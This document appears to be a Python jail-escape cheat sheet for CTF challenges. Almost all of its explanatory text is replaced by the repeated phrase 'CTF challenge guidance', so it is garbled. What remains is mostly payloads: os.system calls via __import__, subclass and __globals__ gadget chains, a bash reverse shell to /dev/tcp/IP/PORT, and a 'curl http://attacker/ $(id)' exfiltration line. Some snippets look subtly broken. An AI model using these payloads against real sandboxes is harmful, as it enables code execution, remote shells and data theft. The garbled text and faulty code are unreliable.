# Python Jail CTF challenge guidance

## CTF challenge guidance

```
CTF challenge guidance eval/exec
├── CTF challenge guidance import 
│   ├── CTF challenge guidance → __import__('os').system('id')
│   └── CTF challenge guidance → CTF challenge guidance builtins
├── CTF challenge guidance __builtins__ 
│   ├── CTF challenge guidance → CTF challenge guidance __builtins__ CTF challenge guidance
│   └── CTF challenge guidance → CTF challenge guidance
├── CTF challenge guidance 
│   ├── CTF challenge guidance → CTF challenge guidance
│   ├── CTF challenge guidance → CTF challenge guidance StringIO/chr()
│   └── CTF challenge guidance → CTF challenge guidance .format() CTF challenge guidance getattr
└── CTF challenge guidance 
    ├── CTF challenge guidance → CTF challenge guidance chr() CTF challenge guidance
    ├── CTF challenge guidance → CTF challenge guidance payload
    └── CTF challenge guidance → CTF challenge guidance
```

## CTF challenge guidance

### 1. CTF challenge guidance
```python
__import__('os').system('id')
__import__('os').popen('id').read()
eval("__import__('os').system('id')")
exec("__import__('os').system('id')")
```

### 2. CTF challenge guidance builtins
```python
__builtins__.__dict__['__import__']('os').system('id')
getattr(getattr(__builtins__, '__im' + 'port__'), 'os').system('id')
```

### 3. CTF challenge guidance func_globals
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('id')
```

### 4. CTF challenge guidance type()
```python
type(type(os))
(type.__subclasses__())
```

### 5. CTF challenge guidance Warning/Exception
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('id')")
```

## CTF challenge guidance (print CTF challenge guidance)

```python
# CTF challenge guidance
print([c.__name__ for c in __builtins__.__dict__.values() if type(c).__name__ == 'type'])

# CTF challenge guidance
for i, c in enumerate([].__class__.__base__.__subclasses__()):
    print(i, c.__name__)
```

## CTF challenge guidance Gadgets

| CTF challenge guidance | CTF challenge guidance | CTF challenge guidance |
|------|------|------|
| `catch_warnings` | ~59 | CTF challenge guidance `__builtins__` |
| `_io._IOBase` | ~80 | CTF challenge guidance |
| `Popen` | ~200+ | CTF challenge guidance |
| `subprocess.Popen` | CTF challenge guidance | CTF challenge guidance |

## CTF challenge guidance

### CTF challenge guidance
```python
getattr(getattr(__builtins__, '\x5f\x5fclass\x5f\x5f'), '\x5f\x5f\x5fimport\x5f\x5f')('os').system('id')

# CTF challenge guidance request CTF challenge guidance（Flask）
request.environ['werkzeug.server.shutdown']
```

### CTF challenge guidance
```python
chr(95)*2  # '__'
# CTF challenge guidance StringIO
import('so'[::-1], fromlist=['os']).system('id')
```

### CTF challenge guidance
```python
getattr(__import__('os'), 'system')('id')
# CTF challenge guidance .__getattribute__ CTF challenge guidance getattr
```

### CTF challenge guidance
```python
# CTF challenge guidance True/False CTF challenge guidance
True.__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']
# True = 1, False = 0
```

### CTF challenge guidance
```python
# CTF challenge guidance shell
__import__('os').system('bash -i >& /dev/tcp/IP/PORT 0>&1')

# CTF challenge guidance base64 CTF challenge guidance
__import__('base64').b64decode('bWFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDAmPnxkZXYvdGNwL0lQL1BPUlQK').decode()
```

## CTF challenge guidance

| CTF challenge guidance | CTF challenge guidance |
|---------|---------|
| `chr()` | CTF challenge guidance |
| `hex()` / `oct()` | CTF challenge guidance |
| `[::-1]` CTF challenge guidance | `so"[::-1]` = `os` |
| `+` CTF challenge guidance | `'os'[0]+'stem'` |
| CTF challenge guidance | `c='o'+'s';__import__(c)` |

## CTF challenge guidance
```python
# CTF challenge guidance，CTF challenge guidance
__import__('os').system('curl http://attacker/ $(id)')
__import__('os').system('ping -c1 attacker.com')
```
